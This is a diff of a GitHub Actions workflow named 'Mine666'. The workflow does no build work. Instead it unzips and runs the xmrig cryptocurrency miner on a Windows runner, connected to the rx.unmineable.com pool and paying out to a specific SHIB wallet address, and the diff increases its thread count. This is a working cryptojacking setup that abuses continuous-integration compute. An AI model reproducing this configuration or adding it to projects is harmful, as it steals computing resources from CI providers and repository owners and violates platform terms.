@@ -1,10 +1,10 @@
-name: eX-code_UMBL
+name: Mine666
  
 on: [workflow_dispatch]
  
 jobs:
   build:
-    name: eX-code_UMBL
+    name: Mine666
     runs-on: windows-latest
     strategy:
       max-parallel: 5
@@ -21,6 +21,6 @@ jobs:
     - name: Seting-UP
       run: Expand-Archive xmrig-6.16.2-msvc-win64.zip
     - name: Running
-      run: .\mine\xmrig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u SHIB:SHIB_WALLET.WORKER_NAME
+      run: .\xmrig-6.16.2-msvc-win64\xmrig-6.16.2\xmrig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 2 --cpu-max-threads-hint 25 -u SHIB:0xb4d7fa729733a59552d0ee356a878d81ac5b8cb2.Mine666
     - name: DONE
       run: exit
